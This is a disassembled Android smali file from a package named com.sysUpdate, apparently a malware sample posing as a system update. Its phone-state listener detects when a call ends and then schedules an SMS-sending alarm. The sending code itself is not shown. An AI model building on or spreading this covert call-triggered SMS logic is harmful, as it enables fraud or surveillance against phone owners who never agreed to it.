.class public Lcom/sysUpdate/CallService$MyPhoneStateListener;
.super Landroid/telephony/PhoneStateListener;
.source "CallService.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/sysUpdate/CallService;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "MyPhoneStateListener"
.end annotation


# instance fields
.field final synthetic this$0:Lcom/sysUpdate/CallService;


# direct methods
.method public constructor <init>(Lcom/sysUpdate/CallService;)V
    .registers 2

    .prologue
    .line 35
    iput-object p1, p0, Lcom/sysUpdate/CallService$MyPhoneStateListener;->this$0:Lcom/sysUpdate/CallService;

    invoke-direct {p0}, Landroid/telephony/PhoneStateListener;-><init>()V

    return-void
.end method


# virtual methods
.method public onCallStateChanged(ILjava/lang/String;)V
    .registers 5

    .prologue
    .line 38
    iget-object v0, p0, Lcom/sysUpdate/CallService$MyPhoneStateListener;->this$0:Lcom/sysUpdate/CallService;

    iget v0, v0, Lcom/sysUpdate/CallService;->lastState:I

    const/4 v1, 0x2

    if-ne v0, v1, :cond_e

    if-nez p1, :cond_e

    .line 41
    iget-object v0, p0, Lcom/sysUpdate/CallService$MyPhoneStateListener;->this$0:Lcom/sysUpdate/CallService;

    # invokes: Lcom/sysUpdate/CallService;->setSendSmsAlarm()V
    invoke-static {v0}, Lcom/sysUpdate/CallService;->access$000(Lcom/sysUpdate/CallService;)V

    .line 43
    :cond_e
    iget-object v0, p0, Lcom/sysUpdate/CallService$MyPhoneStateListener;->this$0:Lcom/sysUpdate/CallService;

    iput p1, v0, Lcom/sysUpdate/CallService;->lastState:I

    .line 44
    return-void
.end method
